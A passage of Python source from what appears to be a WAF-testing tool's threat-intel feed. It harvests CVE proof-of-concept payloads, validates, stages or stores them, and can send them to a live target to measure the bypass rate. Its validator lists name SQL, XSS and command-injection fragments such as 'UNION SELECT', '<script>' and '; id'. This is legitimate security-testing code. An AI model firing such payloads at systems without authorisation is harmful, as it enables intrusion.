    "vendor_github":    {"fn": fetch_vendor_github,      "label": "Vendor GitHub (Akamai, Sigma)"},
    "msrc":             {"fn": fetch_msrc_cvrf,          "label": "MSRC Patch Tuesday (CVRF)"},
    "cloudflare_radar": {"fn": fetch_cloudflare_radar,   "label": "Cloudflare Radar API"},
}


def _auto_wire_new_cves(new_payloads: List["ThreatPayload"], verbose: bool) -> None:
    """#293 — For every new CVE payload added, verify the auto-detection pipeline
    is wired correctly:

    1. Classify the CVE to confirm category is not 'other' or misclassified
    2. Check if the affected tech has a recon check in _TECH_CHECK_MAP
    3. Log any gaps so the developer knows what to add

    This runs after every `fray feed --auto-add` that adds payloads.
    It does NOT modify anything — it's a diagnostic/logging step only.
    """
    cve_payloads = [p for p in new_payloads
                    if getattr(p, "cve", "") and getattr(p, "cve", "").upper().startswith("CVE-")]
    if not cve_payloads:
        return

    gaps: List[str] = []
    wired: List[str] = []
    _cat_kw_map = {c: kws for c, kws in _CATEGORY_RULES}

    for p in cve_payloads[:20]:  # cap to avoid slow output on large feeds
        cve_id = p.cve.upper()
        cat = getattr(p, "category", "") or classify_category(
            getattr(p, "description", "") + " " + (p.payload or "")
        )
        payload_text = p.payload or ""

        # Check 1: category should not be generic
        if cat in ("other", "xss", "sqli") and cve_id in _CVE_POC_VALIDATORS:
            expected_cats = list(_CVE_POC_VALIDATORS[cve_id].get("required_any", []))
            gaps.append(
                f"{cve_id}: classified as '{cat}' but expected "
                f"one of {expected_cats[:2]} — check classify_category()"
            )

        # Check 2: if tech-specific CVE, verify recon check exists
        # Detect tech from category or CVE description
        for tech_cat, check_fn in _TECH_CHECK_MAP.items():
            kws = _cat_kw_map.get(tech_cat, [])
            desc = getattr(p, "description", "") or ""
            if any(kw.lower() in desc.lower() or kw.lower() in payload_text.lower()
                   for kw in kws[:3]):
                try:
                    from fray.recon import checks as _checks_mod
                    if hasattr(_checks_mod, check_fn):
                        wired.append(f"{cve_id} → {check_fn}() ✓")
                    else:
                        gaps.append(
                            f"{cve_id}: tech '{tech_cat}' maps to {check_fn}() "
                            f"but function not found in checks.py — add it"
                        )
                except Exception:
                    pass
                break

    if verbose and (gaps or wired):
        print(f"\n    {_C.DIM}CVE pipeline check ({len(cve_payloads)} new CVE payload(s)):{_C.E}")
        for w in wired[:5]:
            print(f"      {_C.G}✓{_C.E} {_C.DIM}{w}{_C.E}")
        for g in gaps[:5]:
            print(f"      {_C.Y}⚠{_C.E} {_C.Y}{g}{_C.E}")
        if gaps:
            print(f"    {_C.DIM}Fix gaps above to ensure new CVEs are auto-detected by fray go{_C.E}")


def _run_post_feed_smoke(new_payloads: List["ThreatPayload"], verbose: bool) -> None:
    """Run QA smoke test after new payloads are added to the database.

    This catches regressions where a new payload or category change breaks
    existing detection. Only runs the quick mode (detect + recon) on QA targets.
    Prints a summary of any detection gaps introduced.
    """
    try:
        from fray.smoke_test import run_smoke_test
        if verbose:
            cats = {p.category for p in new_payloads}
            print(f"\n  {_C.BL}Running QA smoke test after payload DB update "
                  f"({len(new_payloads)} new payloads in {len(cats)} categories)...{_C.E}")
        results = run_smoke_test(zone="qa", mode="quick", verbose=False, json_output=False)
        passed  = sum(1 for r in results if r.status == "pass")
        failed  = sum(1 for r in results if r.status == "fail")
        gaps    = [f"{r.name}: {a}" for r in results for a in r.assertions_failed]
        if verbose:
            status_color = _C.G if not gaps else _C.Y
            print(f"    {status_color}Smoke: {passed}/{len(results)} passed{_C.E}")
            if gaps:
                print(f"    {_C.Y}Detection gaps after feed update:{_C.E}")
                for g in gaps[:5]:
                    print(f"      {_C.R}✗ {g}{_C.E}")
                if len(gaps) > 5:
                    print(f"      {_C.DIM}… and {len(gaps)-5} more{_C.E}")
            else:
                print(f"    {_C.G}No regressions detected ✓{_C.E}")
    except Exception as e:
        if verbose:
            print(f"    {_C.DIM}Smoke test skipped: {e}{_C.E}")


def run_feed(*, sources: Optional[List[str]] = None,
             since_days: int = 7,
             category_filter: str = "",
             auto_add: bool = False,
             dry_run: bool = False,
             enrich_poc: bool = True,
             test_target: str = "",
             test_delay: float = 0.3,
             test_timeout: int = 8,
             test_verify_ssl: bool = True,
             verbose: bool = True) -> Tuple[List[ThreatPayload], FeedStats]:
    """Run the threat intelligence feed pipeline.

    Args:
        sources: list of source keys (default: all)
        since_days: how far back to look
        category_filter: only this Fray category
        auto_add: automatically add to payload database
        dry_run: show what would be added without writing
        enrich_poc: scrape GitHub/PacketStorm for real PoC payloads (default: True)
        test_target: if set, auto-test new payloads against this URL
        test_delay: delay between test requests
        test_timeout: request timeout for tests
        test_verify_ssl: verify SSL during tests
        verbose: print progress

    Returns:
        (payloads, stats)
    """
    stats = FeedStats()
    cache = _load_cache()
    seen_cves = set(cache.get("seen_cves", []))
    seen_hashes = set(cache.get("seen_hashes", []))

    if verbose:
        print(f"\n  {_C.B}Fray Threat Intelligence Feed{_C.E}")
        print(f"  {_C.DIM}Looking back: {since_days} days | "
              f"Category: {category_filter or 'all'}{_C.E}")

    # Select sources
    active_sources = sources or list(_SOURCES.keys())
    all_payloads: List[ThreatPayload] = []

    for src_key in active_sources:
        src = _SOURCES.get(src_key)
        if not src:
            if verbose:
                print(f"\n  {_C.Y}Unknown source: {src_key}{_C.E}")
            continue

        if verbose:
            print(f"\n  {_C.BL}[{src['label']}]{_C.E}")

        stats.sources_queried += 1
        try:
            fn = src["fn"]
            # Build kwargs based on function signature
            kwargs = {"verbose": verbose}
            if "since_days" in fn.__code__.co_varnames:
                kwargs["since_days"] = since_days
            if "category_filter" in fn.__code__.co_varnames:
                kwargs["category_filter"] = category_filter
            if "enrich_poc" in fn.__code__.co_varnames:
                kwargs["enrich_poc"] = enrich_poc
            payloads = fn(**kwargs)
            stats.items_fetched += len(payloads)
            all_payloads.extend(payloads)
        except Exception as e:
            err = f"{src['label']}: {e}"
            stats.errors.append(err)
            if verbose:
                print(f"    {_C.R}Error: {e}{_C.E}")

    if verbose:
        print(f"\n  {_C.BL}Deduplicating...{_C.E}")

    # Deduplicate against cache + existing payloads
    existing_hashes = _load_existing_payload_hashes()
    new_payloads = []
    for p in all_payloads:
        h = p.hash
        # Skip if we've seen this payload before
        if h in seen_hashes or h in existing_hashes:
            stats.payloads_duplicate += 1
            continue
        # Skip if we've processed this CVE before AND it already has payloads
        # (don't skip CVEs that were seen but had 0 payloads — they may have
        # new PoCs available now)
        if p.cve and p.cve in seen_cves and h in existing_hashes:
            stats.payloads_duplicate += 1
            continue
        seen_hashes.add(h)
        if p.cve:
            seen_cves.add(p.cve)
        new_payloads.append(p)
        stats.payloads_new += 1

    stats.payloads_extracted = len(all_payloads)

    if verbose:
        print(f"    Total fetched:    {stats.items_fetched}")
        print(f"    After dedup:      {_C.B}{len(new_payloads)}{_C.E} new payloads")
        print(f"    Skipped (dupes):  {stats.payloads_duplicate}")

    # ── PoC accuracy validation before adding ─────────────────────────────────
    # For each new payload that has a CVE ID, verify the payload actually
    # matches the CVE mechanism before adding to the database.
    # This catches the class of bug where classify_category() misclassifies
    # a CVE (e.g. CVE-2026-27979 DoS → "command_injection") and generates
    # a generic SQLi payload instead of the real PoC.
    if new_payloads and not dry_run:
        validated, rejected = _validate_poc_accuracy(new_payloads, verbose)
        if rejected and verbose:
            print(f"    {_C.Y}PoC validation: {len(rejected)} payload(s) rejected "
                  f"(mismatch between CVE mechanism and generated payload){_C.E}")
            for r in rejected[:3]:
                print(f"      {_C.DIM}✗ {r.cve}: {r.payload[:60]!r}{_C.E}")
        new_payloads = validated

    # Stage or auto-add
    if new_payloads and not dry_run:
        if auto_add:
            added = _add_to_database(new_payloads, verbose)
            stats.payloads_added = added
        else:
            _stage_payloads(new_payloads, verbose)

    # Update cache
    cache["seen_cves"] = list(seen_cves)
    cache["seen_hashes"] = list(seen_hashes)
    cache["last_fetch"][",".join(active_sources)] = (
        datetime.now(timezone.utc).isoformat()
    )
    cache["stats"]["total_fetched"] += stats.items_fetched
    cache["stats"]["total_added"] += stats.payloads_added
    cache["stats"]["total_skipped"] += stats.payloads_duplicate
    _save_cache(cache)

    # Summary
    if verbose:
        print(f"\n  {_C.B}Feed Summary{_C.E}")
        print(f"    Sources:    {stats.sources_queried}")
        print(f"    Fetched:    {stats.items_fetched}")
        print(f"    New:        {_C.G}{stats.payloads_new}{_C.E}")
        print(f"    Duplicate:  {stats.payloads_duplicate}")
        if stats.payloads_added:
            print(f"    Added:      {_C.G}{stats.payloads_added} to payload database{_C.E}")
        elif new_payloads and not dry_run and not auto_add:
            print(f"    Staged:     {_C.CY}{len(new_payloads)} in ~/.fray/staged_payloads/{_C.E}")
            print(f"    {_C.DIM}Run 'fray feed --auto-add' or review staged payloads{_C.E}")

    # ── #293 CVE→payload auto-pipeline ────────────────────────────────────────
    # After adding new payloads, extract any CVE IDs and ensure each one has:
    #   1. Correct category classification (not misclassified as sqli/xss for a DoS CVE)
    #   2. A recon check function wired if the affected tech is in _TECH_CHECK_MAP
    #   3. The payload validates against _CVE_POC_VALIDATORS
    # This runs silently — no output unless verbose and new CVE-tagged payloads found.
    if stats.payloads_added > 0 and not dry_run:
        _auto_wire_new_cves(new_payloads, verbose)

    # ── Auto smoke-test after payload DB changes ──────────────────────────────
    if stats.payloads_added > 0 and not dry_run and auto_add:
        _run_post_feed_smoke(new_payloads, verbose)
        if dry_run:
            print(f"    {_C.Y}(dry-run mode — no files written){_C.E}")
        if stats.errors:
            print(f"    Errors:     {_C.R}{len(stats.errors)}{_C.E}")
            for e in stats.errors:
                print(f"      {_C.R}• {e}{_C.E}")

    # Auto-test new payloads against target
    if new_payloads and test_target and not dry_run:
        test_stats = _test_new_payloads(
            payloads=new_payloads,
            target=test_target,
            delay=test_delay,
            timeout=test_timeout,
            verify_ssl=test_verify_ssl,
            verbose=verbose,
        )
        stats.payloads_tested = test_stats["tested"]
        stats.payloads_bypassed = test_stats["bypassed"]
        stats.payloads_blocked = test_stats["blocked"]
        stats.test_target = test_target

        # Update the threat_intel.json files with test results
        if test_stats["results"]:
            _update_test_results(test_stats["results"], verbose)

    if verbose and stats.payloads_tested > 0:
        bypass_pct = (stats.payloads_bypassed / stats.payloads_tested * 100
                      if stats.payloads_tested else 0)
        print(f"\n  {_C.B}Auto-Test Results{_C.E}")
        print(f"    Target:     {stats.test_target}")
        print(f"    Tested:     {stats.payloads_tested}")
        if stats.payloads_bypassed:
            print(f"    Bypassed:   {_C.G}{stats.payloads_bypassed}{_C.E}")
        print(f"    Blocked:    {stats.payloads_blocked}")
        print(f"    Bypass rate: {_C.B}{bypass_pct:.1f}%{_C.E}")

    return new_payloads, stats


# ── PoC Accuracy Validation ───────────────────────────────────────────────────

# Maps CVE patterns to required payload characteristics.
# If a generated payload for a given CVE doesn't match ANY of the required
# signals, it's rejected as a misclassification before touching the payload DB.
_CVE_POC_VALIDATORS: Dict[str, Dict] = {
    # CVE-2025-29927: payload must contain the middleware subrequest header
    "CVE-2025-29927": {
        "required_any": ["x-middleware-subrequest", "middleware:middleware", "middleware"],
        "rejected_if": ["' OR", "UNION SELECT", "<script>", "SLEEP(", "onerror="],
        "reason": "CVE-2025-29927 is a header-based middleware bypass, not SQLi/XSS",
    },
    # CVE-2026-27978: payload must be POST + null origin or CSRF-related
    "CVE-2026-27978": {
        "required_any": ["null", "Origin:", "Next-Action", "CSRF", "server.action", "sandboxed"],
        "rejected_if": ["' OR", "UNION SELECT", "<script>", "SLEEP("],
        "reason": "CVE-2026-27978 is a CSRF origin bypass, not SQLi/XSS",
    },
    # CVE-2026-27979: payload must mention next-resume or PPR/DoS
    "CVE-2026-27979": {
        "required_any": ["next-resume", "ppr", "postponed", "dos", "Content-Length: 104"],
        "rejected_if": ["' OR", "UNION SELECT", "<script>", "SLEEP(", "; id", "| cat"],
        "reason": "CVE-2026-27979 is a DoS via oversized body buffering, not injection",
    },
    # CVE-2026-29057: payload must be HTTP smuggling / chunked
    "CVE-2026-29057": {
        "required_any": ["Transfer-Encoding", "chunked", "DELETE", "smuggl", "rewrite"],
        "rejected_if": ["' OR", "UNION SELECT", "<script>", "SLEEP("],
        "reason": "CVE-2026-29057 is HTTP smuggling, not injection",
    },
}

# Generic rules applied to ALL CVEs regardless of CVE ID
_GENERIC_POC_RULES = [
    # A "dos" payload should not be an XSS or SQLi string
    ("denial_of_service", {
        "rejected_if": ["<script>", "onerror=", "onload=", "' or ", "union select",
                        "sleep(", "waitfor delay", "; id", "| cat", "|whoami"],
        "reason": "DoS payloads should not be XSS/SQLi strings",
    }),
    # A "csrf" payload should not be a SQLi or XSS string
    ("csrf", {
        "rejected_if": ["' or ", "union select", "sleep(", "waitfor delay",
                        "; id", "| cat", "<script>", "onerror=", "<svg onload"],
        "reason": "CSRF payloads should not be SQLi/XSS strings",
    }),
    # A "nextjs" payload should contain Next.js-specific indicators
    ("nextjs", {
        "required_any": ["x-middleware", "next-resume", "Next-Action", "_next", "middleware", "next.js"],
        "rejected_if": ["' OR", "UNION SELECT"],
        "reason": "Next.js payloads must contain Next.js-specific indicators",
    }),
]


def _validate_poc_accuracy(
    payloads: List[ThreatPayload],
    verbose: bool = False,
) -> tuple:
    """Validate generated payloads match their CVE mechanism before adding to DB.

    Returns (validated_payloads, rejected_payloads).

    This catches the class of bug where a DoS CVE gets classified as
    'command_injection' and generates '; id' as its payload.
    """
    validated: List[ThreatPayload] = []
    rejected: List[ThreatPayload] = []

    for p in payloads:
        payload_lower = (p.payload or "").lower()
        cve = (p.cve or "").upper()
        cat = (p.category or "").lower()
        reject_reason = None

        # 1. CVE-specific validation
        if cve in _CVE_POC_VALIDATORS:
            rules = _CVE_POC_VALIDATORS[cve]
            required = rules.get("required_any", [])
            rejected_if = rules.get("rejected_if", [])

            if rejected_if and any(r.lower() in payload_lower for r in rejected_if):
                reject_reason = rules.get("reason", f"{cve} payload mismatch")
            elif required and not any(r.lower() in payload_lower for r in required):
                reject_reason = (
                    f"{cve}: payload doesn't contain required signal "
                    f"(need one of: {required[:3]})"
                )

        # 2. Generic category-level validation
        if not reject_reason:
            for rule_cat, rules in _GENERIC_POC_RULES:
                if cat == rule_cat:
                    rejected_if = rules.get("rejected_if", [])
                    required = rules.get("required_any", [])
                    if rejected_if and any(r.lower() in payload_lower for r in rejected_if):
                        reject_reason = rules.get("reason", f"{cat} payload mismatch")
                        break
                    if required and not any(r.lower() in payload_lower for r in required):
                        reject_reason = (
                            f"{cat}: payload doesn't match category "
                            f"(need one of: {required[:3]})"
                        )
                        break

        if reject_reason:
            if verbose:
                pass  # Summary printed by caller
            rejected.append(p)
        else:
            validated.append(p)

    return validated, rejected


# ── Auto-test engine ─────────────────────────────────────────────────────────

def _test_new_payloads(*, payloads: List[ThreatPayload], target: str,
                        delay: float = 0.3, timeout: int = 8,
                        verify_ssl: bool = True,
                        verbose: bool = True) -> Dict:
    """Test newly discovered payloads against a live target."""
    from fray.tester import WAFTester

    if verbose:
        print(f"\n  {_C.BL}Auto-Testing {len(payloads)} new payloads against {target}{_C.E}")

    tester = WAFTester(
        target=target,
        timeout=timeout,
        delay=delay,
        verify_ssl=verify_ssl,
    )

    results = []
    tested = 0
    bypassed = 0
    blocked = 0

    for i, p in enumerate(payloads):
        # Skip comment/reference-only payloads
        if p.payload.startswith("#") or len(p.payload) < 5:
            continue

        tested += 1
        if verbose:
            short = p.payload[:50].replace("\n", "\\n")
            print(f"    [{tested}] ", end="", flush=True)

        try:
            result = tester.test_payload(p.payload, param="input")
            is_blocked = result.get("blocked", True)

            if is_blocked:
                blocked += 1
                if verbose:
                    print(f"{_C.R}BLOCKED{_C.E} {short}")
            else:
                bypassed += 1
                if verbose:
                    print(f"{_C.G}BYPASS{_C.E}  {short}")

            results.append({
                "payload_hash": p.hash,
                "category": p.category,
                "cve": p.cve,
                "blocked": is_blocked,
                "status_code": result.get("status_code", 0),
                "payload": p.payload[:200],
            })
        except Exception as e:
            if verbose:
                print(f"{_C.Y}ERROR{_C.E}   {short} ({e})")
            results.append({
                "payload_hash": p.hash,
                "category": p.category,
                "cve": p.cve,
                "blocked": True,
                "error": str(e),
                "payload": p.payload[:200],
            })
            blocked += 1

    if verbose:
        print(f"    {_C.DIM}Tested {tested} payloads{_C.E}")

    return {
        "tested": tested,
        "bypassed": bypassed,
        "blocked": blocked,
        "results": results,
    }


def _update_test_results(results: List[Dict], verbose: bool) -> None:
    """Update threat_intel.json files with test results (blocked/success_rate)."""
    payloads_root = Path(__file__).parent.parent / "payloads"
    if not payloads_root.exists():
        payloads_root = PAYLOADS_DIR

    # Build lookup: hash → result
    result_map = {r["payload_hash"]: r for r in results}

    for json_file in payloads_root.rglob("threat_intel.json"):
        try:
            data = json.loads(json_file.read_text(encoding="utf-8"))
            modified = False
            for entry in data.get("payloads", []):
                ps = entry.get("payload", "")
                if not ps:
                    continue
                h = hashlib.sha256(ps.encode("utf-8", "replace")).hexdigest()[:16]
                if h in result_map:
                    r = result_map[h]
                    entry["blocked"] = r["blocked"]
                    entry["tested_against"] = entry.get("tested_against", [])
                    entry["success_rate"] = 0.0 if r["blocked"] else 1.0
                    modified = True
            if modified:
                json_file.write_text(
                    json.dumps(data, indent=2, ensure_ascii=False),
                    encoding="utf-8")
        except (json.JSONDecodeError, OSError):
            continue


# ── Database integration ──────────────────────────────────────────────────────

def _load_existing_payload_hashes() -> Set[str]:
    """Load hashes of all existing payloads to prevent duplicates."""
    hashes = set()
    payloads_root = Path(__file__).parent.parent / "payloads"
    if not payloads_root.exists():
        payloads_root = PAYLOADS_DIR
    if not payloads_root.exists():
        return hashes

    for json_file in payloads_root.rglob("*.json"):
        try:
            data = json.loads(json_file.read_text(encoding="utf-8"))
            for p in data.get("payloads", []):
                payload_str = p.get("payload", "")
                if payload_str:
                    h = hashlib.sha256(payload_str.encode("utf-8", "replace")).hexdigest()[:16]
                    hashes.add(h)
        except (json.JSONDecodeError, OSError):
            continue

    return hashes


def _stage_payloads(payloads: List[ThreatPayload], verbose: bool) -> None:
    """Stage payloads for review before adding to database."""
    _STAGING_DIR.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    # Group by category
    by_cat: Dict[str, List[ThreatPayload]] = {}
    for p in payloads:
        by_cat.setdefault(p.category, []).append(p)

    for cat, cat_payloads in by_cat.items():
        filename = f"staged_{cat}_{timestamp}.json"
        filepath = _STAGING_DIR / filename
        data = {
            "category": cat,
            "subcategory": f"threat_intel_{cat}",
            "description": f"Auto-discovered payloads from threat intelligence ({len(cat_payloads)} payloads)",
            "source": "fray threat-intel feed",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "count": len(cat_payloads),
            "payloads": [p.to_fray_format(i) for i, p in enumerate(cat_payloads)],
        }
        filepath.write_text(json.dumps(data, indent=2, ensure_ascii=False),
                            encoding="utf-8")
        if verbose:
            print(f"    {_C.G}Staged{_C.E} {len(cat_payloads)} {cat} payloads → {filepath.name}")


def _add_to_database(payloads: List[ThreatPayload], verbose: bool) -> int:
    """Add payloads directly to the Fray payload database."""
    payloads_root = Path(__file__).parent.parent / "payloads"
    if not payloads_root.exists():
        payloads_root = PAYLOADS_DIR
    if not payloads_root.exists():
        if verbose:
            print(f"    {_C.R}Payload directory not found{_C.E}")
        return 0

    # Group by category
    by_cat: Dict[str, List[ThreatPayload]] = {}
    for p in payloads:
        by_cat.setdefault(p.category, []).append(p)

    total_added = 0
    for cat, cat_payloads in by_cat.items():
        target_file = payloads_root / cat / "threat_intel.json"
        target_file.parent.mkdir(parents=True, exist_ok=True)

        # Load existing or create new
        if target_file.exists():
            try:
                existing = json.loads(target_file.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                existing = {"category": cat, "payloads": []}
        else:
            existing = {
                "category": cat,
                "subcategory": f"threat_intel_{cat}",
                "description": f"Auto-discovered payloads from threat intelligence feeds",
                "source": "fray threat-intel feed",
                "count": 0,
                "payloads": [],
            }

        # Deduplicate against existing entries
        existing_set = set()
        for ep in existing.get("payloads", []):
            ps = ep.get("payload", "")
            if ps:
                existing_set.add(hashlib.sha256(
                    ps.encode("utf-8", "replace")).hexdigest()[:16])

        new_entries = []
        start_idx = len(existing.get("payloads", []))
        for i, p in enumerate(cat_payloads):
            if p.hash not in existing_set:
                new_entries.append(p.to_fray_format(start_idx + i))
                existing_set.add(p.hash)

        if new_entries:
            existing.setdefault("payloads", []).extend(new_entries)
            existing["count"] = len(existing["payloads"])
            existing["last_updated"] = datetime.now(timezone.utc).isoformat()
            target_file.write_text(
                json.dumps(existing, indent=2, ensure_ascii=False),
                encoding="utf-8")
            total_added += len(new_entries)
            if verbose:
                print(f"    {_C.G}Added{_C.E} {len(new_entries)} payloads → {cat}/threat_intel.json")

    return total_added


# ── #460 fray vendor-intel ─────────────────────────────────────────────────────

def cmd_vendor_intel(args) -> int:
    """#460 — `fray vendor-intel`: show latest posts from all 18 vendor feeds.

    Fetches the most recent item from each RSS feed and displays:
    - Vendor name + tier
    - Latest post title + date
    - Any CVE IDs mentioned
    - Classified attack category

    Usage:
        fray vendor-intel              # Show all 18 vendor feeds
        fray vendor-intel --tier 1     # Tier 1 only (highest signal)
        fray vendor-intel --json       # JSON output
    """
    import sys
    max_tier    = getattr(args, "tier", 3)
    json_mode   = getattr(args, "json", False)
    _cve_re     = re.compile(r"CVE-\d{4}-\d{4,}", re.IGNORECASE)

    results = []
    sorted_feeds = sorted(_RSS_FEEDS, key=lambda f: f.get("tier", 3))

    for feed in sorted_feeds:
        tier = feed.get("tier", 3)
        if tier > max_tier:
            continue
        name = feed["name"]
        url  = feed["url"]

        entry: Dict[str, Any] = {
            "name": name,
            "tier": tier,
            "url": url,
            "latest_title": "",
            "latest_date": "",
            "latest_link": "",
            "cves": [],
            "category": "",
            "error": "",
        }

        try:
            body = _http_get(url, timeout=8)
            if not body:
                entry["error"] = "unreachable"
                results.append(entry)
                continue

            # Parse first item (RSS or Atom)
            items = re.findall(r"<item>(.*?)</item>", body, re.DOTALL)
            if not items:
                items = re.findall(r"<entry>(.*?)</entry>", body, re.DOTALL)
            if items:
                item = items[0]
                title = _xml_text(item, "title") or ""
                date  = (_xml_text(item, "pubDate") or
                         _xml_text(item, "published") or
                         _xml_text(item, "updated") or "")
                link  = _xml_text(item, "link") or ""
                if not link:
                    m = re.search(r"<link[^>]+href=[\"']([^\"']+)", item)
                    if m:
                        link = m.group(1)
                desc  = (_xml_text(item, "description") or
                         _xml_text(item, "content") or
                         _xml_text(item, "summary") or "")

                full_text = f"{title} {desc}"
                cves = list(set(_cve_re.findall(full_text)))[:5]
                cat  = classify_category(full_text) if full_text.strip() else ""

                # Shorten date to YYYY-MM-DD
                date_short = ""
                if date:
                    dm = re.search(r"\d{4}-\d{2}-\d{2}", date)
                    if dm:
                        date_short = dm.group(0)
                    else:
                        date_short = date[:16]

                entry.update({
                    "latest_title": title[:100],
                    "latest_date":  date_short,
                    "latest_link":  link[:120],
                    "cves":         cves,
                    "category":     cat if cat != "other" else "",
                })
        except Exception as e:
            entry["error"] = str(e)[:60]

        results.append(entry)

    if json_mode:
        print(json.dumps(results, indent=2, ensure_ascii=False))
        return 0

    # ── Terminal display ─────────────────────────────────────────────────
    _TIER_COLORS = {1: "\033[91m", 2: "\033[93m", 3: "\033[90m"}
    _RESET = "\033[0m"
    _BOLD  = "\033[1m"
    _DIM   = "\033[2m"
    _CYAN  = "\033[36m"
    _GREEN = "\033[32m"

    print(f"\n  {_BOLD}Fray Vendor Intelligence — {len(results)} feeds{_RESET}\n")
    print(f"  {'Feed':<28} {'T':<3} {'Date':<12} {'CVEs':<20} {'Category':<18} {'Latest Post'}")
    print(f"  {'─'*28} {'─'*3} {'─'*12} {'─'*20} {'─'*18} {'─'*30}")

    for e in results:
        tier     = e["tier"]
        tc       = _TIER_COLORS.get(tier, _DIM)
        name     = e["name"][:27]
        date     = e.get("latest_date", "")[:11]
        cves_str = (", ".join(e["cves"][:2]) + ("…" if len(e["cves"]) > 2 else ""))[:19] if e["cves"] else ""
        cat      = (e.get("category") or "")[:17]
        title    = (e.get("latest_title") or e.get("error") or "")[:40]
        cve_col  = _GREEN if cves_str else _DIM
        err_col  = "\033[91m" if e.get("error") else ""
        err_rst  = _RESET if e.get("error") else ""

        print(
            f"  {tc}{name:<28}{_RESET} "
            f"{tc}T{tier}{_RESET}  "
            f"{date:<12} "
            f"{cve_col}{cves_str:<20}{_RESET} "
            f"{_DIM}{cat:<18}{_RESET} "
            f"{err_col}{title[:40]}{err_rst}"
        )

    # Summary
    reachable   = sum(1 for e in results if not e.get("error"))
    total_cves  = len({c for e in results for c in e.get("cves", [])})
    print(f"\n  {_DIM}{reachable}/{len(results)} feeds reachable · {total_cves} unique CVEs mentioned this cycle{_RESET}\n")
    return 0
